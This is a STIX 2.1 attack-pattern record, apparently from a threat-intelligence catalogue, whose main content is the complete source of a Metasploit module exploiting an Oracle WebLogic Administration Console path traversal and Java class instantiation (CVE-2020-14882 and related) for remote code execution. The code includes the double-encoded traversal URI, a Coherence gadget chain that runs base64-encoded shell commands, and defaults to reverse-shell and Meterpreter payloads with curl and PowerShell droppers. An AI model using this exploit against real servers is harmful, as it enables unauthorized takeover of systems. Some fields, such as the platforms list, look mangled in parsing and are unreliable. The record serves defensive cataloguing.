{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4613ebc0-43f6-42d0-a114-329290a54138",
    "created": "2024-08-14T17:07:32.139676Z",
    "modified": "2024-08-14T17:07:32.13968Z",
    "name": "Oracle WebLogic Server Administration Console Handle RCE",
    "description": " This module exploits a path traversal and a Java class instantiation in the handle implementation of WebLogic's Administration Console to execute code as the WebLogic user.  Versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are known to be affected.  Tested against 12.2.1.3.0 from Vulhub (Linux) and on Windows.  Warning! Multiple sessions may be created by exploiting this vuln. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/weblogic_admin_handle_rce.rb",
            "external_id": "weblogic_admin_handle_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.oracle.com/security-alerts/cpuoct2020.html"
        },
        {
            "source_name": "reference",
            "url": "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle WebLogic Server Administration Console Handle RCE',\n        'Description' => %q{\n          This module exploits a path traversal and a Java class instantiation\n          in the handle implementation of WebLogic's Administration Console to\n          execute code as the WebLogic user.\n\n          Versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, and\n          14.1.1.0.0 are known to be affected.\n\n          Tested against 12.2.1.3.0 from Vulhub (Linux) and on Windows.\n\n          Warning! Multiple sessions may be created by exploiting this vuln.\n        },\n        'Author' => [\n          'voidfyoo', # Discovery\n          'Jang', # Analysis and PoC\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-14882'], # Auth bypass?\n          ['CVE', '2020-14883'], # RCE?\n          ['CVE', '2020-14750'], # Patch bypass\n          ['EDB', '48971'], # An exploit\n          ['URL', 'https://www.oracle.com/security-alerts/cpuoct2020.html'],\n          ['URL', 'https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf']\n        ],\n        'DisclosureDate' => '2020-10-20', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux', 'win'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :curl,\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_https'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 4,\n        'DefaultOptions' => {\n          'WfsDelay' => 10\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(7001),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_handle(rand_text_alphanumeric(8..42))\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    if res.code == 200 && res.body.include?('Deploying Application')\n      raise RuntimeError\n    end\n\n    # HTTP/1.1 302 Moved Temporarily\n    # [snip]\n    # Location: http://127.0.0.1:7001/console/console.portal?_nfpb=true&_pageLabel=UnexpectedExceptionPage\n    # [snip]\n    unless res.code == 302 &&\n           res.redirection.path == '/console/console.portal' &&\n           res.redirection.query.include?('_pageLabel=UnexpectedExceptionPage')\n      return CheckCode::Safe('Path traversal failed.')\n    end\n\n    CheckCode::Vulnerable('Path traversal successful.')\n  rescue RuntimeError\n    vprint_error('Application is deploying, sleeping and retrying check')\n\n    sleep(1)\n    retry\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd, :win_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper, :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    send_request_handle(coherence_gadget_chain(cmd))\n  end\n\n  def send_request_handle(handle)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => aperture_science_handheld_portal_device,\n      'vars_post' => {\n        'handle' => handle\n      }\n    )\n  end\n\n  def coherence_gadget_chain(cmd)\n    <<~JAVA.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      com.tangosol.coherence.mvel2.sh.ShellSession('\n        java.lang.Runtime.getRuntime().exec(\n          new java.lang.String[] {\n            #{win_target? ? '\"cmd.exe\", \"/c\", ' : '\"/bin/sh\", \"-c\", '}\n            new java.lang.String(\n              java.util.Base64.getDecoder().decode(\"#{Rex::Text.encode_base64(cmd)}\")\n            )\n          }\n        )\n      ')\n    JAVA\n  end\n\n  def aperture_science_handheld_portal_device\n    normalize_uri(target_uri.path, '/console/css/.%252e/console.portal')\n  end\n\n  def win_target?\n    target.platform.names.first == 'Windows'\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-10-20, # Vendor advisory",
    "x_mitre_platforms": [
        "win'"
    ]
}